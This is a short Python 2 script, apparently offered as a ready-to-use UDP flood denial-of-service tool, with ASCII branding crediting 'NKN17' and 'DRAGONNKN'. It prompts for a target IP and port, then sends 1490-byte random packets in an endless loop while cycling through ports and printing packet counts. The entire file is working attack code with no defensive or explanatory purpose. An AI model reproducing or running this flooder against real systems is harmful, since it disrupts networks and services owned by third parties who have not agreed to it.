import socket, os, random, time

B = '\033[1m'

R = '\033[31m'

N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

os.system("clear")

print 

print "["+B+""+R+"#"+N+"] "+B+""+R+"Author : NKN17 "+N+"   NKN Dos From - "+B+""+R+"Cyber-D"+N

print

print("\033[32m===============================NKN=================================\033[0m")

print("\033[32mTool devoloped : DRAGONNKN\033[0m")

print("\033[33mGithub 	       : https://github.com/DRAGONNKN/\033[0m")print("\033[33m Instagram       : N_K_N_17_\033[0m")

print("\033[32m=================================NKN===============================\033[0m")

print

ip = raw_input("[+] Target's IP : ")

port = input('[+] Port: ')

os.system("clear")

print "Attack starting..."

time.sleep(3)

sent = 0

while True:

     white.sendto(bytes, (ip,port))

     sent = sent + 1

     port = port + 1

     print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)

     if port == 65534:

       port = 1
